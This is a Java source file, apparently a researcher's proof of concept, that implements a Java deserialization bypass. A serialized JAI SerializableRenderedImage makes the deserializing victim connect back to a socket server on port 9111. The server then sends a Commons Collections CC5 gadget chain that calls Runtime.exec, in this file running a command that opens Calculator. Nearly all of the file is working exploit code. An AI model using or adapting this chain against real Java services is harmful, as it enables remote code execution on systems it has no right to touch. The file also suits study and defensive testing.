package cn.rui0.bypass;

import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.imageio.ImageIO;
import javax.management.BadAttributeValueExpException;
import javax.media.jai.remote.SerializableRenderedImage;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

import static cn.rui0.idea.Gadget2.getField;

/**
 * Created by ruilin on 2020/2/18.
 */
public class SocketServer {
    public static void setAccessible(AccessibleObject member) {
        // quiet runtime warnings from JDK9+
        Permit.setAccessible(member);
    }
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static void makeSer() throws Exception {
        File imageFile = new File(System.getProperty("user.dir") + "/1.jpg");
        BufferedImage picImage = ImageIO.read(imageFile);
        SerializableRenderedImage serializableRenderedImage = new SerializableRenderedImage(picImage, true);
        getField(SerializableRenderedImage.class, "port").setInt(serializableRenderedImage, 9111);
        FileOutputStream fos = new FileOutputStream("testBypass.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(serializableRenderedImage);
        oos.flush();
    }
    public static void main(String[] args) throws Exception {
        try {

            makeSer();

            ServerSocket server = new ServerSocket(9111);
            while (true) {
                Socket socket = server.accept();
                invoke(socket);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    private static void invoke(final Socket socket) throws IOException {
        new Thread(new Runnable() {
            public void run() {
                ObjectInputStream is = null;
                ObjectOutputStream os = null;
                try {
                    is = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
                    os = new ObjectOutputStream(socket.getOutputStream());
                    //CC5
                    final String[] execArgs = new String[] { "open /System/Applications/Calculator.app" };
                    // inert chain for setup
                    final Transformer transformerChain = new ChainedTransformer(
                            new Transformer[]{ new ConstantTransformer(1) });
                    // real chain for after setup
                    final Transformer[] transformers = new Transformer[] {
                            new ConstantTransformer(Runtime.class),
                            new InvokerTransformer("getMethod", new Class[] {
                                    String.class, Class[].class }, new Object[] {
                                    "getRuntime", new Class[0] }),
                            new InvokerTransformer("invoke", new Class[] {
                                    Object.class, Object[].class }, new Object[] {
                                    null, new Object[0] }),
                            new InvokerTransformer("exec",
                                    new Class[] { String.class }, execArgs),
                            new ConstantTransformer(1) };

                    final Map innerMap = new HashMap();

                    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

                    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

                    BadAttributeValueExpException val = new BadAttributeValueExpException(null);
                    Field valfield = val.getClass().getDeclaredField("val");
                    setAccessible(valfield);
                    valfield.set(val, entry);

                    setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain


                    os.writeObject(val);
                    os.flush();
                } catch (IOException ex) {
                } catch(ClassNotFoundException ex) {
                } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                } catch (InstantiationException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (NoSuchFieldException e) {
                    e.printStackTrace();
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    try {
                        is.close();
                    } catch(Exception ex) {}
                    try {
                        os.close();
                    } catch(Exception ex) {}
                    try {
                        socket.close();
                    } catch(Exception ex) {}
                }
            }
        }).start();
    }
}
